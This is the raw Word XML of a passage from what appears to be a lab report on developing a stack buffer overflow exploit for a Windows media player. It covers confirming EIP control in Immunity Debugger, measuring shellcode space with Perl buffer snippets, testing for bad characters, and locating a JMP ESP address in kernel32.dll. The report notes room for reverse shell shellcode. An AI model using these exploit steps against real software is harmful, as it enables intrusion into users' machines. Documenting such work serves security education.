        <w:t>the contents</w:t>
      </w:r>
      <w:r w:rsidR="009A01B1">
        <w:t xml:space="preserve"> after.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="255FF3E8" w14:textId="55A0DF94" w:rsidR="00D01D16" w:rsidRDefault="00D01D16" w:rsidP="00D01D16"/>
    <w:p w14:paraId="4F8A43B3" w14:textId="56A804AB" w:rsidR="005E1F6C" w:rsidRDefault="009A01B1" w:rsidP="00D01D16">
      <w:r>
        <w:t>Running this crash file through Immunity reveal</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that the program </w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>tries</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> run the values after the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00AE09B1">
        <w:t>As</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>as</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> an executable (</w:t>
      </w:r>
      <w:r w:rsidRPr="009C7442">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 10</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="009C7442">
        <w:t>, proving that the offset was calculated correctly</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9DB680" w14:textId="77777777" w:rsidR="00090631" w:rsidRDefault="00090631" w:rsidP="00D01D16"/>
    <w:p w14:paraId="6AD8BF0A" w14:textId="511FCD33" w:rsidR="009A01B1" w:rsidRDefault="005E1F6C" w:rsidP="005E1F6C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251675648" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="67BC03D8" wp14:editId="71AAC6FE">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>895433</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>16510</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4095750" cy="152400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="18900"/>
                <wp:lineTo x="21500" y="18900"/>
                <wp:lineTo x="2150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095750" cy="152400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C66A5D0" w14:textId="09CD8745" w:rsidR="005E1F6C" w:rsidRDefault="009A01B1" w:rsidP="005E1F6C">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - The access violation as it appears in Immunity (</w:t>
      </w:r>
      <w:r w:rsidRPr="000512B5">
        <w:t>42424242 = BBBB in little endian</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520A5E4C" w14:textId="77777777" w:rsidR="00090631" w:rsidRPr="00090631" w:rsidRDefault="00090631" w:rsidP="00090631"/>
    <w:p w14:paraId="31900FD0" w14:textId="1926C65D" w:rsidR="00972ED7" w:rsidRDefault="00972ED7" w:rsidP="00972ED7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc103326461"/>
      <w:r>
        <w:t>Calculating Shellcode Space</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="4BF9879E" w14:textId="38EEB4E2" w:rsidR="00AA5528" w:rsidRDefault="000641DA" w:rsidP="00090631">
      <w:r>
        <w:t xml:space="preserve">To calculate the space available for shellcode, modify </w:t>
      </w:r>
      <w:r w:rsidR="000E0753">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t>Perl</w:t>
      </w:r>
      <w:r w:rsidR="000E0753">
        <w:t xml:space="preserve"> file </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">(or create a new one) </w:t>
      </w:r>
      <w:r w:rsidR="000E0753">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t xml:space="preserve">append many C’s after </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t>“BBBB” (which signifies the location of the EIP)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t xml:space="preserve">he difference between the memory locations where they begin and end </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">can then be calculated </w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t>from the debugger display</w:t>
      </w:r>
      <w:r>
        <w:t>, giving the full shellcode space available</w:t>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CA325D" w14:textId="79C359AE" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0869CD5B" wp14:editId="250844A7">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2047875</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>96520</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2114550" cy="838200"/>
                <wp:effectExtent l="0" t="0" r="19050" b="190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838200"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6CB18D2A" w14:textId="6185E675" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:t>…</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="78967BE8" w14:textId="6F8216CC" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                            </w:pPr>
                            <w:r w:rsidRPr="005E6DDC">
                              <w:t>$buffer .= "</w:t>
                            </w:r>
                            <w:r>
                              <w:t>BBBB”;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5E0B4481" w14:textId="5CA1A21F" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                            </w:pPr>
                            <w:r w:rsidRPr="005E6DDC">
                              <w:t>$buffer .= "C" x 10</w:t>
                            </w:r>
                            <w:r w:rsidR="00730517">
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="005E6DDC">
                              <w:t>000;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1ABD5E9F" w14:textId="799ABAA8" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:r>
                              <w:t>…</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6998693F" w14:textId="031F2CED" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="code"/>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9CD5B" id="_x0000_s1030" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:161.25pt;margin-top:7.6pt;width:166.5pt;height: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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6CB18D2A" w14:textId="6185E675" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:t>…</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="78967BE8" w14:textId="6F8216CC" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                      <w:r w:rsidRPr="005E6DDC">
                        <w:t>$buffer .= "</w:t>
                      </w:r>
                      <w:r>
                        <w:t>BBBB”;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5E0B4481" w14:textId="5CA1A21F" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                      <w:r w:rsidRPr="005E6DDC">
                        <w:t>$buffer .= "C" x 10</w:t>
                      </w:r>
                      <w:r w:rsidR="00730517">
                        <w:t>0</w:t>
                      </w:r>
                      <w:r w:rsidRPr="005E6DDC">
                        <w:t>000;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1ABD5E9F" w14:textId="799ABAA8" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:r>
                        <w:t>…</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6998693F" w14:textId="031F2CED" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="58119518" w14:textId="31FCD405" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FF45A08" w14:textId="77777777" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="00090631"/>
    <w:p w14:paraId="31A03184" w14:textId="2B734394" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="00090631">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251683840" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1EA4C43A" wp14:editId="2A1F481D">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1200150</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>97155</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3657600" cy="29400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657600" cy="294005"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="28472EEF" w14:textId="1FCD8F59" w:rsidR="005E6DDC" w:rsidRPr="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>9</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - A new line added in crash1.pl to test the maximum shellcode size. </w:t>
                            </w:r>
                            <w:r w:rsidRPr="005E6DDC">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                              </w:rPr>
                              <w:t>See Appendix B3 for the full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4C43A" id="Text Box 22" o:spid="_x0000_s1031" type="#_x0000_t202" style="position:absolute;margin-left:94.5pt;margin-top:7.65pt;width:4in;height:23.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" stroked="f">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="28472EEF" w14:textId="1FCD8F59" w:rsidR="005E6DDC" w:rsidRPr="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>9</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - A new line added in crash1.pl to test the maximum shellcode size. </w:t>
                      </w:r>
                      <w:r w:rsidRPr="005E6DDC">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                        </w:rPr>
                        <w:t>See Appendix B3 for the full code.</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="6027AA6D" w14:textId="77777777" w:rsidR="008A26FF" w:rsidRDefault="008A26FF" w:rsidP="00090631"/>
    <w:p w14:paraId="013AC26D" w14:textId="2AB068B9" w:rsidR="00AA5528" w:rsidRDefault="00AA5528" w:rsidP="00090631">
      <w:r>
        <w:t xml:space="preserve">After running this new file through the application and the debugger, the following crash information appeared. Looking at the ESP Register value reveals the beginning of the C’s to be in </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA5528">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>0011BEA8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and scrolling down in the dump menu until the C’s stop reveals the ending location to be </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA5528">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>001</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>17168</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01362AC6" w14:textId="77777777" w:rsidR="008A26FF" w:rsidRDefault="008A26FF" w:rsidP="00090631"/>
    <w:p w14:paraId="5ECD96CA" w14:textId="524A91D9" w:rsidR="00AA5528" w:rsidRDefault="00730517" w:rsidP="00AA5528">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11CA1BEF" wp14:editId="119E5B18">
            <wp:extent cx="3533775" cy="11334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3775" cy="1133475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="419F7A27" w14:textId="0DED4FC4" w:rsidR="008A26FF" w:rsidRPr="008A26FF" w:rsidRDefault="00AA5528" w:rsidP="008A26FF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Immunity Output after testing shellcode size with 1</w:t>
      </w:r>
      <w:r w:rsidR="00730517">
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t>0000 characters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB19817" w14:textId="329EFC0B" w:rsidR="002460EF" w:rsidRDefault="00AA5528" w:rsidP="00AA5528">
      <w:r>
        <w:t xml:space="preserve">The next step </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to perform a simple calculation, done here in Python, of the difference between the two locations.</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t xml:space="preserve"> From Figure 11, it can be seen that all of the C’s had made it into the buffer meaning the shellcode space is at least </w:t>
      </w:r>
      <w:r w:rsidR="00730517">
        <w:t>46017</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t xml:space="preserve"> bytes long. This </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t xml:space="preserve"> more than enough for </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>a message box</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t xml:space="preserve"> or even reverse shell shellcode, the size of which generally</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> varies from 50 -</w:t>
      </w:r>
      <w:r w:rsidR="00044ED7">
        <w:t xml:space="preserve"> 500 bytes</w:t>
      </w:r>
      <w:r w:rsidR="008A26FF">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAB257B" w14:textId="5E339F96" w:rsidR="008A26FF" w:rsidRDefault="00730517" w:rsidP="008A26FF">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251712512" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7D7E214B" wp14:editId="2FCE76F2">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>1870710</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>192656</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2181225" cy="314325"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="20945"/>
                <wp:lineTo x="21506" y="20945"/>
                <wp:lineTo x="2150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81225" cy="314325"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="458DD809" w14:textId="77777777" w:rsidR="002460EF" w:rsidRDefault="002460EF" w:rsidP="008A26FF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ABF569F" w14:textId="11F9B8A1" w:rsidR="008A26FF" w:rsidRDefault="008A26FF" w:rsidP="008A26FF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>11</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Python calculation output. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3736B8EB" w14:textId="24082380" w:rsidR="002460EF" w:rsidRDefault="008A26FF" w:rsidP="002460EF">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note- The last character can be seen on the next line in Figure 10, making the total </w:t>
      </w:r>
      <w:r w:rsidR="00730517">
        <w:t>46,017</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6746B034" w14:textId="77777777" w:rsidR="002460EF" w:rsidRPr="002460EF" w:rsidRDefault="002460EF" w:rsidP="002460EF"/>
    <w:p w14:paraId="03DA081D" w14:textId="2F2D0BC6" w:rsidR="00BD22DA" w:rsidRPr="00BD22DA" w:rsidRDefault="00BD22DA" w:rsidP="00BD22DA">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc103326462"/>
      <w:r>
        <w:t>Finding a JMP ESP and Bad Character Testing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="4E790BC4" w14:textId="27C4AE44" w:rsidR="008A26FF" w:rsidRDefault="008A26FF" w:rsidP="008A26FF">
      <w:r>
        <w:t xml:space="preserve">Testing for bad characters </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>can be</w:t>
      </w:r>
      <w:r w:rsidR="00770BC8">
        <w:t xml:space="preserve"> done by creating a new Perl file - “badchar.pl”</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t xml:space="preserve"> in which all </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">possible ASCII symbols </w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>will be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B513D1">
        <w:t>appended</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and removed one by one if the program detected any of them as forbidden</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>. The file also pack</w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t xml:space="preserve"> a JMP ESP instruction, which replaces the BBBB’s for the Pointer Register with a jump to another file, which on the next line will return back and land at the beginning of the shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C90D398" w14:textId="14C584E3" w:rsidR="00BD22DA" w:rsidRDefault="00BD22DA" w:rsidP="008A26FF">
      <w:r>
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> done by first locating a valid .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file to point to, which w</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t>ill</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> then jump the program back to any code within the .ini file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B382869" w14:textId="4BC77831" w:rsidR="00BD22DA" w:rsidRDefault="00BD22DA" w:rsidP="008A26FF">
      <w:r>
        <w:t xml:space="preserve">Looking at the “Executable Modules” window </w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t xml:space="preserve">in Immunity after loading in the media player </w:t>
      </w:r>
      <w:r>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:t>that the program makes use of kernel32.dll, which is well known to make use of a valid JMP instruction.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B8FCA3" w14:textId="77777777" w:rsidR="00BD22DA" w:rsidRDefault="00BD22DA" w:rsidP="00BD22DA">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0376B2CD" wp14:editId="7BB61E90">
            <wp:extent cx="4029075" cy="1247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9075" cy="1247775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A58901E" w14:textId="44137A60" w:rsidR="00BD22DA" w:rsidRDefault="00BD22DA" w:rsidP="00BD22DA">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>12</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Executable Modules includes Kernel32.dll</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE52975" w14:textId="339820C2" w:rsidR="00BB08BD" w:rsidRDefault="00BD22DA" w:rsidP="008A26FF">
      <w:r>
        <w:t xml:space="preserve">The command prompt tool “findjmp.exe” </w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidR="000641DA">
        <w:t xml:space="preserve"> be</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> utilized here to</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> find the JMP ESP instruction within the .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BB08BD">
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> file. This show</w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> that memory location </w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD" w:rsidRPr="00BB08BD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>0x7C86467B</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> ma</w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>kes</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> use of exactly what </w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> needed. Note, other .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
